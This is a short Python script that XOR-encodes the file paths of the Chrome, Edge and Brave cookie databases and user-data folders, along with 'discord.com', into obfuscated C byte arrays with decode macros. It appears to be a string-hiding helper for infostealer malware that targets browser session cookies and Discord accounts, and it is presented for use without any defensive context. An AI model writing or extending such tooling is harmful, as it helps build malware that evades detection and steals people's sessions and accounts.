KEY=[0x5A,0x6D,0xCB,0x9F]
items = [
    ('CHROME_COOKIE_DB', 'Google\\Chrome\\User Data\\Default\\Network\\Cookies'),
    ('EDGE_COOKIE_DB', 'Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'),
    ('BRAVE_COOKIE_DB', 'BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies'),
    ('CHROME_USERDATA', 'Google\\Chrome\\User Data'),
    ('EDGE_USERDATA', 'Microsoft\\Edge\\User Data'),
    ('BRAVE_USERDATA', 'BraveSoftware\\Brave-Browser\\User Data'),
    ('DISCORD_DOT_COM', 'discord.com'),
]
for n,s in items:
    enc = ','.join(f'0x{ord(c)^KEY[i%4]:02x}' for i,c in enumerate(s))
    print(f'/* "{s}" */')
    print(f'static const BYTE ENC_{n}[] = {{{enc}}};')
    print(f'#define DEC_{n}(buf) _xd(buf, ENC_{n}, {len(s)}, 0x5A)')
    print()
